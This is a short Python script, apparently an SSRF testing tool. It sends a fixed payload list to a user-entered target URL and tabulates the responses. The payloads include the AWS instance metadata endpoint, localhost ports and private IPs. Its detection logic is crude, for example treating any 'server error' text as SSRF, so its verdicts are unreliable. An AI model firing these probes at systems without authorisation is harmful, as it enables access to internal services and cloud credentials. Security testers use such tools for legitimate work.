import requests
import time
from prettytable import PrettyTable

def send_request(url, data=None, allow_redirects=True):
    """Send an HTTP request to the specified URL."""
    try:
        if data:
            response = requests.post(url, data=data, allow_redirects=allow_redirects)
        else:
            response = requests.get(url, allow_redirects=allow_redirects)
        return response
    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return None

def test_ssrf(url, payloads):
    """Test for Server-Side Request Forgery (SSRF) vulnerabilities using the provided payloads."""
    table = PrettyTable(["URL", "Payload", "Status Code", "SSRF Detected", "Redirected URL"])
    table.align["SSRF Detected"] = "l"

    for payload in payloads:
        test_url = f"{url}?param={payload}"
        response = send_request(test_url, allow_redirects=False)
        
        if response:
            status_code = response.status_code
            ssrf_detected = "No"
            redirected_url = "N/A"

            if status_code == 200 and "success" in response.text.lower():
                ssrf_detected = "Yes"
                table.add_row([test_url, payload, status_code, ssrf_detected, redirected_url])
                print(f"    [+] SSRF detected: {test_url}")
                break
            elif status_code == 301 or status_code == 302:
                redirected_url = response.headers.get("Location")
                table.add_row([test_url, payload, status_code, "Redirected", redirected_url])
                print(f"    [!] Redirected to {redirected_url}: {test_url}")
            elif "server error" in response.text.lower():
                table.add_row([test_url, payload, status_code, "Server Error", redirected_url])
                print(f"    [!] Server error: {test_url}")
            else:
                table.add_row([test_url, payload, status_code, ssrf_detected, redirected_url])
        else:
            table.add_row([test_url, payload, "No Response", ssrf_detected, redirected_url])
        
        time.sleep(0.1)

    print(table)

    # Perform additional checks for SSRF
    print("\nAdditional Checks:")
    additional_table = PrettyTable(["URL", "Check Type", "Result"])
    additional_table.align["Check Type"] = "l"

    for payload in payloads:
        test_url = f"{url}?param={payload}"
        response = send_request(test_url, allow_redirects=False)
        
        if response:
            # Check for open redirect
            if response.status_code == 301 or response.status_code == 302:
                additional_table.add_row([test_url, "Open Redirect", "Detected"])
                print(f"    [!] Open redirect detected: {test_url}")
            
            # Check for server-side request forgery
            if "server error" in response.text.lower():
                additional_table.add_row([test_url, "Server-Side Request Forgery", "Detected"])
                print(f"    [!] Server-side request forgery detected: {test_url}")
            
            # Check for DNS rebinding
            if "dns rebinding" in response.text.lower():
                additional_table.add_row([test_url, "DNS Rebinding", "Detected"])
                print(f"    [!] DNS rebinding detected: {test_url}")
        
        time.sleep(0.1)

    print(additional_table)

ssrf_payloads = [
        "http://localhost:80",  # Localhost
        "http://169.254.169.254/latest/meta-data/",  # AWS metadata endpoint
        "http://127.0.0.1:8080",  # Localhost on another port
        "http://example.com",  # External URL
        "http://your.internal.service",  # Internal service
        "http://192.168.1.1",  # Common internal IP
    ]
if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    test_ssrf(target_url, ssrf_payloads)
